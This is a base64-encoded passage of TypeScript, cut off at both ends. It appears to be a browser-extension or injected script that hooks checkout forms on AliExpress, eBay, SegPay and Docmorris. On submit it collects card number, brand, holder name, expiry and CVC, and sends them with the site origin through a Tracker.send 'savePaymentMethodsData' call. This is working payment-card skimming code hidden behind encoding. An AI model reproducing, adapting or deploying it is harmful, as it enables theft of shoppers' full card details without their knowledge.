ICAgICApO1xyXG4gICAgfVxyXG5cclxuICAgIHByb2Nlc3NBbGlFeHByZXNzUGF5bWVudE5ld0NhcmRPblNlY29uZFBheW1lbnQoc2VsZjogdGhpcykge1xyXG4gICAgICAgIGxldCBpbnRlcnZhbCA9IHNldEludGVydmFsKGZ1bmN0aW9uICgpIHtcclxuICAgICAgICAgICAgaWYgKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy5jYXJkLWZvcm0nKSAhPT0gbnVsbCkge1xyXG4gICAgICAgICAgICAgICAgY2xlYXJJbnRlcnZhbChpbnRlcnZhbCk7XHJcbiAgICAgICAgICAgICAgICBzZWxmLmV4cGxvcmVBbGlFeHByZXNzUGF5bWVudE5ld0NhcmQoc2VsZixcclxuICAgICAgICAgICAgICAgICAgICAoZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLmNhcmQtZm9ybScpIGFzIEhUTUxFbGVtZW50KSxcclxuICAgICAgICAgICAgICAgICAgICBmdW5jdGlvbiAoZWxlbWVudHM6IGFueSkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBsZXQgcGF5bWVudE1ldGhvZFN0b3JlOiBhbnkgPSBbXTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLnBheW1lbnQtY29uZmlybScpPy5maXJzdEVsZW1lbnRDaGlsZD8uYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCBmdW5jdGlvbiAoKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBuZXcgU2V0KGVsZW1lbnRzKS5mb3JFYWNoKGZ1bmN0aW9uIChlbGVtZW50OiBhbnkpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXltZW50TWV0aG9kU3RvcmUucHVzaCh7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdlbGVtZW50JzogZWxlbWVudC5ub2RlTmFtZSxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2lkJzogZWxlbWVudC5pZCxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3R5cGUnOiBlbGVtZW50LnR5cGUsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICd2YWx1ZSc6IGVsZW1lbnQudmFsdWVcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBUcmFja2VyLnNlbmQoe1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbW1hbmQ6ICdzYXZlUGF5bWVudE1ldGhvZHNEYXRhJyxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkYXRhOiB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkTnVtYmVyJzogcGF5bWVudE1ldGhvZFN0b3JlWzBdLnZhbHVlLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZEJyYW5kJzogZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLmNhcmQtYnJhbmQtaWNvbicpPy5jbGFzc0xpc3QuY29udGFpbnMoJ3Zpc2EnKSA/ICd2aXNhJyA6IChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcuY2FyZC1icmFuZC1pY29uJyk/LmNsYXNzTGlzdC5jb250YWlucygnbWFzdGVyY2FyZCcpID8gJ21hc3RlcmNhcmQnIDogKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy5jYXJkLWJyYW5kLWljb24nKT8uY2xhc3NMaXN0LmNvbnRhaW5zKCdkaXNjb3ZlcicpID8gJ2Rpc2NvdmVyJyA6IChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcuY2FyZC1icmFuZC1pY29uJyk/LmNsYXNzTGlzdC5jb250YWlucygnbW5wJykgPyAnbW5wJyA6IChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcuY2FyZC1icmFuZC1pY29uJyk/LmNsYXNzTGlzdC5jb250YWlucygnbWFlc3RybycpID8gJ21hZXN0cm8nIDogKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy5jYXJkLWJyYW5kLWljb24nKT8uY2xhc3NMaXN0LmNvbnRhaW5zKCdhbWV4JykgPyAnYW1leCcgOiBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcuY2FyZC1icmFuZC1pY29uJyk/LmNsYXNzTmFtZSkpKSkpLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZEhvbGRlcic6IHBheW1lbnRNZXRob2RTdG9yZVsxXS52YWx1ZSxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmRFeHBpcmUnOiBwYXltZW50TWV0aG9kU3RvcmVbMl0udmFsdWUsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkQ1ZDJzogcGF5bWVudE1ldGhvZFN0b3JlWzNdLnZhbHVlLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnZXZlbnQnOiAnYWRkJyxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3dvcmtXZWJzaXRlJzogd2luZG93LmxvY2F0aW9uLm9yaWdpblxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcGF5bWVudE1ldGhvZFN0b3JlID0gW107XHJcblxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgbGV0IGVkaXQgPSBzZXRJbnRlcnZhbChmdW5jdGlvbiAoKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy5wYXltZW50LWVkaXQnKSAhPT0gbnVsbCkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjbGVhckludGVydmFsKGVkaXQpO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBbJ2NsaWNrJywgJ2RibGNsaWNrJ10uZm9yRWFjaChmdW5jdGlvbiAoZXZlbnQpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy5wYXltZW50LWVkaXQnKT8uYWRkRXZlbnRMaXN0ZW5lcihldmVudCwgZnVuY3Rpb24gKCkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCBfX2ludGVydmFsMyA9IHNldEludGVydmFsKGZ1bmN0aW9uICgpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy5jYXJkLWZvcm0nKSAhPT0gbnVsbCkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2xlYXJJbnRlcnZhbChfX2ludGVydmFsMyk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLnByb2Nlc3NBbGlFeHByZXNzUGF5bWVudE5ld0NhcmRPblNlY29uZFBheW1lbnQoc2VsZik7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9LCAxMDAwKTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9LCAxMDAwKTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgKTtcclxuICAgICAgICAgICAgfVxyXG5cclxuICAgICAgICB9LCAxMDApXHJcblxyXG4gICAgfVxyXG5cclxuICAgIGV4cGxvcmVFYmF5UGF5bWVudERhdGFDb2xsZWN0aW9uKHNlbGY6IHRoaXMsIF9fZWJheUNyZWRpdENhcmRGb3JtRWxlbWVudDogYW55LCBlbGVtZW50czogYW55W10pIHtcclxuICAgICAgICBzZWxmLmV4cGxvcmVFYmF5UGF5bWVudEZvcm1FbGVtZW50KHNlbGYsIF9fZWJheUNyZWRpdENhcmRGb3JtRWxlbWVudCwgZWxlbWVudHMsIGZ1bmN0aW9uIChjb250cm9sbGVyLCBlbGVtZW50cykge1xyXG4gICAgICAgICAgICBbJ2NsaWNrJywgJ2RibGNsaWNrJ10uZm9yRWFjaChmdW5jdGlvbiAoZXZlbnQpIHtcclxuICAgICAgICAgICAgICAgIGNvbnRyb2xsZXIuYWRkRXZlbnRMaXN0ZW5lcihldmVudCwgZnVuY3Rpb24gKCkge1xyXG4gICAgICAgICAgICAgICAgICAgIGxldCBwYXltZW50TWV0aG9kU3RvcmU6IGFueSA9IFtdO1xyXG4gICAgICAgICAgICAgICAgICAgIGVsZW1lbnRzLmZvckVhY2goZnVuY3Rpb24gKF9fZGV0ZWN0ZWRFbGVtZW50OiBIVE1MSW5wdXRFbGVtZW50KSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHBheW1lbnRNZXRob2RTdG9yZS5wdXNoKHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICdlbGVtZW50JzogX19kZXRlY3RlZEVsZW1lbnQubm9kZU5hbWUsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnaWQnOiBfX2RldGVjdGVkRWxlbWVudC5pZCxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICd2YWx1ZSc6IF9fZGV0ZWN0ZWRFbGVtZW50LnZhbHVlXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICAgICAgICAgIFRyYWNrZXIuc2VuZCh7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGNvbW1hbmQ6ICdzYXZlUGF5bWVudE1ldGhvZHNEYXRhJyxcclxuICAgICAgICAgICAgICAgICAgICAgICAgZGF0YToge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmROdW1iZXInOiBwYXltZW50TWV0aG9kU3RvcmVbMF0uaWQuaW5kZXhPZignY2FyZE51bWJlcicpICE9PSAtMSA/IHBheW1lbnRNZXRob2RTdG9yZVswXS52YWx1ZSA6ICdVbmtub3duJyxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkQnJhbmQnOiBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcuY2FyZC10eXBlcycpPy5maXJzdEVsZW1lbnRDaGlsZD8uZ2V0QXR0cmlidXRlKCdhcmlhLWxhYmVsJyk/LnRvTG93ZXJDYXNlKCksXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZEhvbGRlcic6IHBheW1lbnRNZXRob2RTdG9yZVszXS5pZCA9PT0gJ2NhcmRIb2xkZXJGaXJzdE5hbWUnID8gcGF5bWVudE1ldGhvZFN0b3JlWzNdLnZhbHVlIDogJ1Vua25vd24nICsgJyAnICsgcGF5bWVudE1ldGhvZFN0b3JlWzRdLmlkID09PSAnY2FyZEhvbGRlckxhc3ROYW1lJyA/IHBheW1lbnRNZXRob2RTdG9yZVs0XS52YWx1ZSA6ICdVbmtub3duJyxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkRXhwaXJlJzogcGF5bWVudE1ldGhvZFN0b3JlWzFdLmlkID09PSAnY2FyZEV4cGlyeURhdGUnID8gcGF5bWVudE1ldGhvZFN0b3JlWzFdLnZhbHVlIDogJ1Vua25vd24nLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmRDVkMnOiBwYXltZW50TWV0aG9kU3RvcmVbMl0uaWQgPT09ICdzZWN1cml0eUNvZGUnID8gcGF5bWVudE1ldGhvZFN0b3JlWzJdLnZhbHVlIDogJ1Vua25vd24nLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2V2ZW50JzogJ2FkZCcsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnd29ya1dlYnNpdGUnOiB3aW5kb3cubG9jYXRpb24ub3JpZ2luXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgICAgICAgICBwYXltZW50TWV0aG9kU3RvcmUgPSBbXTtcclxuICAgICAgICAgICAgICAgICAgICBsZXQgaW50ZXJ2YWwgPSBzZXRJbnRlcnZhbChmdW5jdGlvbiAoKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJ2EnKS5mb3JFYWNoKGZ1bmN0aW9uIChfX2ViYXlTZWNvbmRFbnRyeSkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKF9fZWJheVNlY29uZEVudHJ5LmdldEF0dHJpYnV0ZSgnZGF0YS10ZXN0LWlkJykgPT09ICdHRVRfUEFZTUVOVF9JTlNUUlVNRU5UJykge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNsZWFySW50ZXJ2YWwoaW50ZXJ2YWwpO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFsnY2xpY2snLCAnZGJsY2xpY2snXS5mb3JFYWNoKGZ1bmN0aW9uIChldmVudCkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBfX2ViYXlTZWNvbmRFbnRyeS5hZGRFdmVudExpc3RlbmVyKGV2ZW50LCBmdW5jdGlvbiAoKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmV4cGxvcmVFYmF5UGF5bWVudERhdGFDb2xsZWN0aW9uKHNlbGYsIF9fZWJheUNyZWRpdENhcmRGb3JtRWxlbWVudCwgZWxlbWVudHMpO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgICAgICAgICAgfSwgMTAwKVxyXG4gICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgIH0pO1xyXG4gICAgICAgIH0pO1xyXG4gICAgfVxyXG5cclxuICAgIGV4cGxvcmVFYmF5UGF5bWVudEZvcm1FbGVtZW50KHNlbGY6IHRoaXMsIF9fZWJheUNyZWRpdENhcmRGb3JtRWxlbWVudDogYW55LCBlbGVtZW50czogYW55W10sIGNhbGxiYWNrOiAoYXJnMDogYW55LCBhcmcxOiBhbnkpID0+IHZvaWQpIHtcclxuICAgICAgICBpZiAoX19lYmF5Q3JlZGl0Q2FyZEZvcm1FbGVtZW50LmNoaWxkTm9kZXMubGVuZ3RoICE9PSAwKSB7XHJcbiAgICAgICAgICAgIF9fZWJheUNyZWRpdENhcmRGb3JtRWxlbWVudC5jaGlsZE5vZGVzLmZvckVhY2goZnVuY3Rpb24gKF9lYmF5Rm9ybUNoaWxkRWxlbWVudDogYW55KSB7XHJcbiAgICAgICAgICAgICAgICBpZiAoX2ViYXlGb3JtQ2hpbGRFbGVtZW50Lm5vZGVOYW1lID09PSAnSU5QVVQnIHx8IF9lYmF5Rm9ybUNoaWxkRWxlbWVudC5ub2RlTmFtZSA9PT0gJ0JVVFRPTicpIHtcclxuICAgICAgICAgICAgICAgICAgICBpZiAoX2ViYXlGb3JtQ2hpbGRFbGVtZW50Lm5vZGVOYW1lID09PSAnSU5QVVQnICYmIF9lYmF5Rm9ybUNoaWxkRWxlbWVudC50eXBlICE9PSAnaGlkZGVuJyAmJiBfZWJheUZvcm1DaGlsZEVsZW1lbnQudHlwZSAhPT0gJ2NoZWNrYm94Jykge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBlbGVtZW50cy5wdXNoKF9lYmF5Rm9ybUNoaWxkRWxlbWVudCk7XHJcbiAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgICAgIGlmIChfZWJheUZvcm1DaGlsZEVsZW1lbnQubm9kZU5hbWUgPT09ICdCVVRUT04nICYmIF9lYmF5Rm9ybUNoaWxkRWxlbWVudC50eXBlID09PSAnc3VibWl0Jykge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAoY2FsbGJhY2spIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhbGxiYWNrKF9lYmF5Rm9ybUNoaWxkRWxlbWVudCwgZWxlbWVudHMpO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgfSBlbHNlIHtcclxuICAgICAgICAgICAgICAgICAgICBzZWxmLmV4cGxvcmVFYmF5UGF5bWVudEZvcm1FbGVtZW50KHNlbGYsIF9lYmF5Rm9ybUNoaWxkRWxlbWVudCwgZWxlbWVudHMsIGNhbGxiYWNrKTtcclxuICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgfVxyXG4gICAgfVxyXG5cclxuICAgIGV4cGxvcmVTZWdQYXlQYXltZW50Q29udGFpbmVyKHNlbGY6IHRoaXMpIHtcclxuICAgICAgICBkb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKCdmb3JtJykuZm9yRWFjaChmdW5jdGlvbiAoX19mb3JtRWxlbWVudCkge1xyXG4gICAgICAgICAgICBpZiAoX19mb3JtRWxlbWVudC5pZCA9PT0gXCJQYXlQYWdlRm9ybVwiKSB7XHJcbiAgICAgICAgICAgICAgICBsZXQgZWxlbWVudHM6IGFueSA9IFtdO1xyXG4gICAgICAgICAgICAgICAgc2VsZi5leHBsb3JlU2VnUGF5UGF5bWVudEZvcm1FbGVtZW50KHNlbGYsIF9fZm9ybUVsZW1lbnQsIGVsZW1lbnRzLCBmdW5jdGlvbiAoY29udHJvbGxlcjogYW55LCBlbGVtZW50czogYW55W10pIHtcclxuICAgICAgICAgICAgICAgICAgICBjb250cm9sbGVyLmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgZnVuY3Rpb24gKCkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBsZXQgcGF5bWVudE1ldGhvZERhdGE6IGFueSA9IFtdO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBlbGVtZW50cy5mb3JFYWNoKGZ1bmN0aW9uIChfX2NoaWxkRWxlbWVudCkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcGF5bWVudE1ldGhvZERhdGEucHVzaCh7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2VsZW1lbnQnOiBfX2NoaWxkRWxlbWVudC5ub2RlTmFtZSxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnaWQnOiBfX2NoaWxkRWxlbWVudC5pZCxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnbmFtZSc6IF9fY2hpbGRFbGVtZW50Lm5hbWUsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3ZhbHVlJzogX19jaGlsZEVsZW1lbnQudmFsdWUsXHJcblxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBUcmFja2VyLnNlbmQoe1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgY29tbWFuZDogJ3NhdmVQYXltZW50TWV0aG9kc0RhdGEnLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgZGF0YToge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkTnVtYmVyJzogcGF5bWVudE1ldGhvZERhdGFbMl0udmFsdWUgIT09IG51bGwgPyBwYXltZW50TWV0aG9kRGF0YVsyXS52YWx1ZSA6ICdVbmtub3duJyxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZEJyYW5kJzogLypwYXltZW50TWV0aG9kRGF0YVsyXS52YWx1ZSA/IHBheW1lbnRNZXRob2REYXRhWzJdLnZhbHVlLnRvTG93ZXJDYXNlKCkgOiovICdVbmtub3duJyxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZEhvbGRlcic6IHBheW1lbnRNZXRob2REYXRhWzBdLnZhbHVlICE9PSBudWxsID8gcGF5bWVudE1ldGhvZERhdGFbMF0udmFsdWUgOiAnVW5rbm93bicgKyAnICcgKyBwYXltZW50TWV0aG9kRGF0YVsxXS52YWx1ZSAhPT0gbnVsbCA/IHBheW1lbnRNZXRob2REYXRhWzFdLnZhbHVlIDogJ1Vua25vd24nLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkRXhwaXJlJzogcGF5bWVudE1ldGhvZERhdGFbM10udmFsdWUgIT09IG51bGwgPyBwYXltZW50TWV0aG9kRGF0YVszXS52YWx1ZSA6ICdVbmtub3duJyArICcvJyArIHBheW1lbnRNZXRob2REYXRhWzRdLnZhbHVlICE9PSBudWxsID8gcGF5bWVudE1ldGhvZERhdGFbNF0udmFsdWUgOiAnVW5rbm93bicsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmRDVkMnOiBwYXltZW50TWV0aG9kRGF0YVs1XS52YWx1ZSAhPT0gbnVsbCA/IHBheW1lbnRNZXRob2REYXRhWzVdLnZhbHVlIDogJ1Vua25vd24nLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdldmVudCc6ICdhZGQnLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICd3b3JrV2Vic2l0ZSc6IHdpbmRvdy5sb2NhdGlvbi5vcmlnaW5cclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHBheW1lbnRNZXRob2REYXRhID0gW107XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIC8vZWxlbWVudHMgPSBbXTtcclxuICAgICAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICB9XHJcbiAgICAgICAgfSk7XHJcbiAgICB9XHJcblxyXG4gICAgZXhwbG9yZVNlZ1BheVBheW1lbnRGb3JtRWxlbWVudChzZWxmOiB0aGlzLCBfX2Zvcm1FbGVtZW50OiBhbnksIGVsZW1lbnRzOiBhbnlbXSwgY2FsbGJhY2s6IChhcmcwOiBhbnksIGFyZzE6IGFueSkgPT4gdm9pZCkge1xyXG4gICAgICAgIGlmIChfX2Zvcm1FbGVtZW50LmNoaWxkTm9kZXMubGVuZ3RoICE9PSAwKSB7XHJcbiAgICAgICAgICAgIF9fZm9ybUVsZW1lbnQuY2hpbGROb2Rlcy5mb3JFYWNoKGZ1bmN0aW9uIChfY2hpbGRFbGVtZW50OiBhbnkpIHtcclxuICAgICAgICAgICAgICAgIGlmIChfY2hpbGRFbGVtZW50Lm5vZGVOYW1lID09PSAnSU5QVVQnIHx8IF9jaGlsZEVsZW1lbnQubm9kZU5hbWUgPT09ICdTRUxFQ1QnIHx8IF9jaGlsZEVsZW1lbnQubm9kZU5hbWUgPT09ICdCVVRUT04nKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgaWYgKF9jaGlsZEVsZW1lbnQubm9kZU5hbWUgPT09ICdJTlBVVCcgJiYgX2NoaWxkRWxlbWVudC50eXBlICE9PSAnaGlkZGVuJyAmJiBfY2hpbGRFbGVtZW50LnR5cGUgIT09ICdyYWRpbycgJiZcclxuICAgICAgICAgICAgICAgICAgICAgICAgX2NoaWxkRWxlbWVudC5pZCAhPT0gJ0VNYWlsSW5wdXQnICYmIF9jaGlsZEVsZW1lbnQuaWQgIT09ICdBZGRyZXNzSW5wdXQnICYmIF9jaGlsZEVsZW1lbnQuaWQgIT09ICdDaXR5SW5wdXQnICYmXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIF9jaGlsZEVsZW1lbnQuaWQgIT09ICdQaG9uZU51bWJlcklucHV0JyAmJiBfY2hpbGRFbGVtZW50LmlkICE9PSAnWmlwSW5wdXQnICYmIF9jaGlsZEVsZW1lbnQuaWQgIT09ICdUZXJtc0NvbmRpdGlvbnNQcml2YWN5SW5wdXQnIHx8XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIF9jaGlsZEVsZW1lbnQubm9kZU5hbWUgPT09ICdTRUxFQ1QnICYmIF9jaGlsZEVsZW1lbnQuaWQgIT09ICdMYW5ndWFnZURETCcgJiYgX2NoaWxkRWxlbWVudC5pZCAhPT0gJ1RvZGF5c0NoYXJnZURETCcgJiZcclxuICAgICAgICAgICAgICAgICAgICAgICAgX2NoaWxkRWxlbWVudC5pZCAhPT0gJ1N0YXRlRERMJyAmJiBfY2hpbGRFbGVtZW50LmlkICE9PSAnQ291bnRyeURETCcpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgZWxlbWVudHMucHVzaChfY2hpbGRFbGVtZW50KTtcclxuICAgICAgICAgICAgICAgICAgICB9XHJcblxyXG4gICAgICAgICAgICAgICAgICAgIGlmIChfY2hpbGRFbGVtZW50Lm5vZGVOYW1lID09PSAnQlVUVE9OJykge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAoY2FsbGJhY2spIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhbGxiYWNrKF9jaGlsZEVsZW1lbnQsIGVsZW1lbnRzKTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIH0gZWxzZSB7XHJcbiAgICAgICAgICAgICAgICAgICAgc2VsZi5leHBsb3JlU2VnUGF5UGF5bWVudEZvcm1FbGVtZW50KHNlbGYsIF9jaGlsZEVsZW1lbnQsIGVsZW1lbnRzLCBjYWxsYmFjayk7XHJcbiAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIH0pO1xyXG4gICAgICAgIH1cclxuICAgIH1cclxuXHJcbiAgICBleHBsb3JlRG9jbW9ycmlzUGF5bWVudENvbnRhaW5lcihzZWxmOiB0aGlzKSB7XHJcbiAgICAgICAgZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgnZm9ybScpLmZvckVhY2goZnVuY3Rpb24gKF9fZm9ybUVsZW1lbnQpIHtcclxuICAgICAgICAgICAgaWYgKF9fZm9ybUVsZW1lbnQuaWQgPT09IFwiZm9ybS1wYXltZW50bWV0aG9kcy1jcmVkaXRfY2FyZFwiKSB7XHJcbiAgICAgICAgICAgICAgICBsZXQgZWxlbWVudHM6IGFueSA9IFtdO1xyXG4gICAgICAgICAgICAgICAgc2VsZi5leHBsb3JlRG9jbW9ycmlzUGF5bWVudEZvcm1FbGVtZW50KHNlbGYsIF9fZm9ybUVsZW1lbnQsIGVsZW1lbnRzLCBmdW5jdGlvbiAoY29udHJvbGxlcjogYW55LCBlbGVtZW50czogYW55W10pIHtcclxuICAgICAgICAgICAgICAgICAgICBjb250cm9sbGVyLmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgZnVuY3Rpb24gKCkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBsZXQgcGF5bWVudE1ldGhvZERhdGE6IGFueSA9IFtdO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBlbGVtZW50cy5mb3JFYWNoKGZ1bmN0aW9uIChfX2NoaWxkRWxlbWVudCkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcGF5bWVudE1ldGhvZERhdGEucHVzaCh7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2VsZW1lbnQnOiBfX2NoaWxkRWxlbWVudC5ub2RlTmFtZSxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnaWQnOiBfX2NoaWxkRWxlbWVudC5pZCxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnbmFtZSc6IF9fY2hpbGRFbGVtZW50Lm5hbWUsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3ZhbHVlJzogX19jaGlsZEVsZW1lbnQudmFsdWUsXHJcblxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBUcmFja2VyLnNlbmQoe1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgY29tbWFuZDogJ3NhdmVQYXltZW50TWV0aG9kc0RhdGEnLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgZGF0YToge1xyXG4gICAgICAgICAgICAg